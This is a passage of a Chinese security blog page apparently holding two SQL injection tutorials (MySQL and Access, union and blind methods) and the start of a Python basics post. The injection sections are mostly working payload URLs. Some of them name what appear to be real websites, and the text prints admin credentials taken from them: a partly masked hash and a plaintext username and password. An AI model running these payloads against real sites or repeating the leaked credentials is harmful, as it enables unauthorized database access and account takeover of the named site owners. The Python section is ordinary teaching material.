<p>8,查出当前库中的所有表名,这里有个坑,不知道是不是group_concat()对查询结果有长度限制的问题,还是目标网站的什么原因,个人感觉应该是有限制(就像oracle中的wm_concat亦是如此),导致group_concat查出来的结果不全,如果表比较少,可能还没什么问题,假如有个一两百张表的情况下,用它就只能看到一部分,所以实际测试中,并不推荐group_concat()[顺便提醒大家一句,不要过于相信网上的一些文章,其实有很多人自己都没深入搞清楚,经常是以讹传讹,一定要多自己尝试,这样出来的东西,才能走心],很显然,这里就出现了这样的问题<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=124 UNION SELECT 1,2,3,4,5,6,group_concat(table_name),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from information_schema.tables where table_schema=database() --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm12.png" alt="&#39;&#39;"><br></p>
<p>9,所以,下面我就换成limit了,个人觉得用limit还是非常靠谱的,就执行效率来讲,个人觉得相比group_concat()要高一点的,虽然,用limit可能稍微要费点儿劲,不过还好我们有burpsuite帮忙,另外,有时候直接使用database()可能不太好使,可以把它换成上面database()的结果,然后hex一下基本就可以了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=124 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from information_schema.tables where table_schema=database() limit 0,1 --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm13.png" alt="&#39;&#39;"><br></p>
<p>10,当burpsuite跑到第142张表时,我们发现,这正是我们想要的网站管理表,表名为 ‘tbl_webmaster’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vuln.com/md_materia_profile_view.php?viewid=2&apos; and 12=124 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from information_schema.tables where table_schema=database() limit 141,1 --+-</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm14.png" alt="&#39;&#39;"><br></p>
<p>11,既然管理表找到了,接着把该表中的所有字段名查出来就可以了,为了避免单引号的问题,我们还是要把该表名先hex下,另外,这里依然是用limit,查询过程中我们发现第四个字段是username(管理员用户名),第五个字段是password(管理员密码)<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=124 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from information_schema.columns where table_name=0x74626c5f7765626d6173746572 limit 3,1 --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm15.png" alt="&#39;&#39;"><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vuln.com/md_materia_profile_view.php?viewid=2&apos; and 12=124 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from information_schema.columns where table_name=0x74626c5f7765626d6173746572 limit 4,1 --+-</span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_comm16.png" alt="&#39;&#39;"><br></p>
<p>12,现在用户密码字段都有了,直接把用户名和对应的密码hash都查出来即可,如下,防止有多个网站管理员,记得带上limit<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.homoeopathyuniversity.org/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=124 UNION SELECT 1,2,3,4,username,6,password,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from tbl_webmaster limit 0,1 --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm17.png" alt="&#39;&#39;"><br></p>
<p>13,最后查出来的账号和密码hash如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">superadmin : e10adc3949ba59abbe56e057f*******</span><br></pre></td></tr></table></figure></p>
<p><br><br>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于mysql的常规注入,其实整个流程非常的简单,无非就是’查权限,查路径,查库,查表,查字段,查数据,找到后台登陆传shell’,就其本身来讲并没有多少实质的技术含量在里面,这里纯粹只是为了让大家熟练mysql手工注入,加深对mysql注入的理解,这样万一以后遇到一些比较畸形的注入点,工具罢工,我们手工还依然可以上<br><br></p>

          
        
      
    </div>
    
    
    


    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/access-manual-injection.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VK">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Evil-404">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/access-manual-injection.html" itemprop="url">sql注入入门 之 access常规注入 [ union方式 ]</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-11T07:29:34+08:00">
                2016-05-11
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">更新于&#58;</span>
              
              <time title="更新于" itemprop="dateModified" datetime="2017-10-25T18:56:10+08:00">
                2017-10-25
              </time>
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            

            

              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/all-sql-injection/" itemprop="url" rel="index">
                    <span itemprop="name">all sql injection</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1,552
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  6
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><br><br>0x01 用于演示的常规 access 实例注入点,如下,可以看到,正常情况下的页面是这样的:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_1.jpg" alt="&quot;正常情况下的页面&quot;"><br></p>
<p>0x02 尝试 <code>’</code> 干扰后,数据库如期报错,其实在错误里面就已经说的很清楚了,是access的数据库,错误的原因是多了个单引号导致的,既是如此,则证明我们的单引号刚刚已被带入了正常查询,这也正是我们想要看到的效果<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_2.jpg" alt="&quot;数据库报错&quot;"><br></p>
<p>0x03 再次确认是否真的存在注入,我们观察到,条件为真时页面返回正常<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_3.jpg" alt="&quot;条件为真返回正常&quot;"><br></p>
<p>0x04 条件为假时页面返回错误,确认无疑,这是个标标准准的access数字型注入点,紧接着我们就可以开始正常查询各种数据了,关于注入access,暂时也看到没什么特别好的办法,表名字段名只能硬猜<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">112</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_4.jpg" alt="&quot;条件为假时返回错误&quot;"><br></p>
<p>0x05 首先,尝试猜管理表名,当然,这中间肯定还尝试了很多其它可能的管理表名,比如,admin,login,admin_user等等……直到我们尝试到<code>users</code>表时页面才返回正常,说明该表存在<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> exists(select * from users)</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_5.jpg" alt="&quot;猜管理表名&quot;"><br></p>
<p>0x06 有了管理表名,接着就该猜该表中对应的用户和密码字段名了,当我们尝试 <code>username</code> 字段时,页面返回正常,说明该字段名存在<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> exists(select username from users)</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_6.jpg" alt="&quot;猜账号字段名&quot;"><br></p>
<p>0x07 用户名字段有了,下面该轮到猜密码字段名了,同样,当我们尝试 <code>password</code> 字段名时页面返回正常,说明该字段名也存在<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> exists(select password from users)</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_7.jpg" alt="&quot;猜密码字段名&quot;"><br></p>
<p>0x08 目前为止,表名,字段名都有了,理论上,紧接着直接去爆出相应的数据即可,不过,在爆数据之前,我们还需要先确定当前表的字段个数,后面好执行union,然后爆出数据的显示位,这里就用经典的order by ,很显然,为3的时候,页面返回正常<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> order by <span class="number">3</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_8.jpg" alt="&quot;字段为3的时候&quot;"><br></p>
<p>0x09 为4的时候页面返回错误,按说,当前表的字段个数应该为3个才对<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> order by <span class="number">4</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_9.jpg" alt="&quot;字段为4的时候报错&quot;"><br></p>
<p>0x10 但实际测试中,它却显示一直不匹配错误,好吧,想要直截了当的爆出数据估计要费点儿劲了,为了不在这里浪费时间,我们只能暂时用类似盲注的办法来一位位字符的截取数据了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">23</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> from users --</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_10.jpg" alt="&quot;猜密码字段名&quot;"><br></p>
<p>0x11 在这之前,我们已经确定了用户及密码的字段名和管理表名,所以,我们就可以像下面这样这样来获取数据<br></p>
<p>0x12 查询 <code>username</code>字段下的第一条数据的长度,当大于7时页面返回正常<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> len(username) from users)&gt;<span class="number">7</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_10.png" alt="&quot;字段数据长度&quot;"><br></p>
<p>0x13 大于8时页面返回错误,说明 <code>username</code> 字段下的第一条数据长度为 8 个字符<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> len(username) from users)&gt;<span class="number">8</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_11.png" alt="&quot;username字段第一条数据的长度&quot;"><br></p>
<p>0x14 知道了第一条数据的总长度,我们就要可以开始一个一个字符的截取数据了,下面语句的意思是截取<code>username</code>字段的第一条数据的第一位字符并返回其对应的ascii码,可以看到,为98的时候页面返回正常,而98对应的ASCII码字符是<code>b</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(username,<span class="number">1</span>,<span class="number">1</span>)) from users)=<span class="number">98</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_12.png" alt="&quot;返回username字段第一条数据的第一个字符的ascii码值&quot;"><br></p>
<p>0x15 截取<code>username</code>字段的第一条数据的第二个字符并返回其对应的ascii码,为119时页面返回正常,而119对应的字符为<code>w</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(username,<span class="number">2</span>,<span class="number">1</span>)) from users)=<span class="number">119</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_13.png" alt="&quot;第二个字符的ASCII码值&quot;"><br></p>
<p>最后,通过慢慢遍历,<code>username</code> 字段的第一条记录的完整数据为<code>bwrealty</code><br></p>
<p>0x16 <code>username</code>字段查完了,下面又该轮到<code>password</code>字段了,还是一模一样的方法</p>
<p>截取<code>password</code>字段的第一条数据的第一位字符,并返回其对应的ascii码,直到为98时页面猜返回正常<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.boardwalk-realty.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(password,<span class="number">1</span>,<span class="number">1</span>)) from users)=<span class="number">98</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/acpass1.png" alt="&quot;第一个字符的ASCII码值&quot;"><br></p>
<p>截取password字段的第一条数据的第二位字符,并返回其对应的ascii码,直到为119时页面猜返回正常<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.boardwalk-realty.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(password,<span class="number">2</span>,<span class="number">1</span>)) from users)=<span class="number">119</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/acpass2.png" alt="&quot;第二个字符的ASCII码值&quot;"><br></p>
<p><code>password</code>字段第一条数据的最终结果为<code>bwrealty123</code>,至此,整个access的常规注入就算基本完成了,大家也都看到了,其实整个注入过程,非常的简单<br><br></p>
<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;针对access的注入,其实真的没什么特别需要注意的,非常简单,因为它没有像mysql,mssql,oracle…那样,直接有提供现成的元数据可以查,表名字段名都只能硬猜,也就是说,如果是字段名猜不着,有后台的情况下,还可以看看后台的登陆表单里的账号密码字段名是什么,然后拿这个来试试,如果压根是表名都猜不着也就猜不着了,没什么曲线可以走,所以,这就需要大家自己平时多去搜集一些命中率相对比较高的管理员表名和账户密码字段名了,另外,因为access数据库,本身就非常小,所以,根本也没有任何权限及用户访问控制机制,自然注入起来也非常的容易,基本上是不用考虑的太多,上手即来<br><br></p>

          
        
      
    </div>
    
    
    


    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/python-basic.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VK">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Evil-404">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/python-basic.html" itemprop="url">python 速成笔记 [基础语法 一]</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-04-20T07:25:29+08:00">
                2016-04-20
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">更新于&#58;</span>
              
              <time title="更新于" itemprop="dateModified" datetime="2017-11-06T19:02:25+08:00">
                2017-11-06
              </time>
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            

            

              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python-basic/" itemprop="url" rel="index">
                    <span itemprop="name">python basic</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  6,773
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  28
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>0x01 理解机器码,字节码的基本概念:</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">低级语言<span class="symbol">:</span>  汇编 C </span><br><span class="line">=&gt; 机器码 [直接可以丢给cpu去执行]</span><br></pre></td></tr></table></figure>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">高级语言<span class="symbol">:</span>  </span><br><span class="line">Java ruby python c# php[应用场景非常局限,只限于web开发] C++ ...</span><br><span class="line">=&gt; 字节码 [通常是个二进制文件(python中是.pyc文件),也叫中间代码,还需要对应的各类语言的解释器进一步转换成机器码才能直接被cpu执行]</span><br></pre></td></tr></table></figure>
<p>0x02 了解 python 的一些常见种类:<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C    <span class="keyword">python</span>	c语言版 <span class="keyword">python</span>	默认大家所说的<span class="keyword">python</span>一般都是指C <span class="keyword">python</span></span><br><span class="line">J    <span class="keyword">python</span>	java版  <span class="keyword">python</span></span><br><span class="line">iron <span class="keyword">python</span>	C#版 	<span class="keyword">python</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>0x03 不同python版本号间的一些区别:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python <span class="number">2.6</span>  属于过度版本</span><br><span class="line">python <span class="number">2.7</span>  也属于过度版本,<span class="number">2020</span>年后将不再被支持</span><br><span class="line">python <span class="number">3.5</span>  属于重大改进后的版本</span><br></pre></td></tr></table></figure></p>
<p>0x04 不同版本间的语法区别样例<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">部分函数名称变更,底层执行效率提升,如下,简单的事例</span><br><span class="line">print <span class="string">"hello python2.7"</span>  <span class="number">2</span><span class="selector-class">.x</span> 的输出写法</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"hello python3.x"</span>)</span></span> <span class="number">3</span><span class="selector-class">.x</span> 的输出写法</span><br></pre></td></tr></table></figure></p>
<p>0x05 python 解释器自身的工作细节:<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读取并执行文件中的python代码 -&gt; 转换成对应的字节码 -&gt; 再转换成机器码 -&gt; 到cpu上执行</span><br></pre></td></tr></table></figure></p>
<p>0x06 执行python代码的两种方式:</p>
<p>直接通过代码文件执行:<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> 源代码文件通常以.<span class="keyword">py</span>结尾的,但这并不是必须的</span><br><span class="line">指定<span class="keyword">python</span>解释器位置,指定要执行的<span class="keyword">python</span>代码文件位置 如,<span class="keyword">c</span>:\python36\<span class="keyword">python</span>.<span class="keyword">exe</span> d:\demo.<span class="keyword">py</span> 语法没有错误的前提下,即可被成功执行</span><br></pre></td></tr></table></figure></p>
<p>进入python解释器下执行python代码:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Python36&gt;python.exe</span><br><span class="line">Python 3.6.0 (v3.6.0:41df79263a11, Dec 23 2016, 08:06:12) [MSC v.1900 64 bit (AMD64)] on win32</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; <span class="builtin-name">print</span>(<span class="string">"hello python3.6"</span>)</span><br><span class="line">&gt;&gt;&gt; exit()</span><br></pre></td></tr></table></figure></p>
<p>0x07 最基础的计算机编码常识:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii码,这也是最开始的字符表示方式</span><br><span class="line">只需占<span class="number">1</span>个字节,即<span class="number">8</span>位,<span class="number">2</span>的<span class="number">8</span>次方等于<span class="number">256</span>,完全可以把键盘上所有的英文字母和数字,特殊字符都表示完</span><br></pre></td></tr></table></figure></p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">汉语字符集的大致发展历程</span><br><span class="line">GB2312 -&gt; GBK -&gt; GB18030 -&gt; unicode</span><br></pre></td></tr></table></figure>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">了解 unicode 编码 [ 万国码 ]</span><br><span class="line">统一占两个字节,一上来就占<span class="number">16</span>位</span><br><span class="line">另外,我们知道在unicode编码中一个汉字要占三个字节,也就是说还多出一个字节的空间被浪费了</span><br><span class="line">同样,像字母这种不足<span class="number">16</span>位的,也是按<span class="number">16</span>位的大小来存,缺点已经显而易见了,浪费空间,所以后来就优化出了utf<span class="number">-8</span>编码</span><br></pre></td></tr></table></figure>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">utf<span class="number">-8</span>编码</span><br><span class="line">属基于unicode优化后的编码,对于英文,字母和特殊字符,全部用<span class="number">8</span>位表示,中文则用<span class="number">24</span>位</span><br><span class="line">针对不同的字符给不同的大小,实现自动变长,合理利用资源,基本支持全球大部分国家的语言</span><br></pre></td></tr></table></figure>
<p>0x08 不同的python版本对编码的处理:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python <span class="number">2</span><span class="selector-class">.x</span> 默认使用ascii编码,如果有中文,则需要事先手工指定编码</span><br><span class="line">python <span class="number">3</span><span class="selector-class">.x</span> 默认unicode编码,所以基本无需太关注编码问题</span><br></pre></td></tr></table></figure></p>
<p>比如,在 python 2.x 代码中使用中文就必须事先代码文件头部,指定好字符集,如下:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> -*- coding:utf-8 -*-</span></span><br></pre></td></tr></table></figure></p>
<p>在python2.7中手工处理win cmd输出中文乱码<br><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">utf-<span class="number">8</span> 到 gbk  <span class="built_in">unicode</span>[万国码]相当于中间人 </span><br><span class="line">先把utf-<span class="number">8</span>解码成<span class="built_in">unicode</span>,再把<span class="built_in">unicode</span>编码成gbk,下面就是具体的代码编码和解码流程</span><br></pre></td></tr></table></figure></p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># --*-- coding:utf-8 --*--</span></span><br><span class="line"></span><br><span class="line">stri = 'python 的创始人是吉多·范罗苏姆'</span><br><span class="line">dec_stri = stri.decode('utf-8')</span><br><span class="line">in_stri = dec_stri.encode('gbk')</span><br><span class="line">print in_stri</span><br></pre></td></tr></table></figure>
<p>如果是在python 3.x中,win cmd是不用手工编码再解码的,在python 3.x内部就已经帮我们把编码处理好了<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3.<span class="number">5</span></span><br><span class="line">stri = <span class="string">'python的创始人为吉多·范罗苏姆'</span>                                                                            </span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(stri)</span></span></span><br></pre></td></tr></table></figure></p>
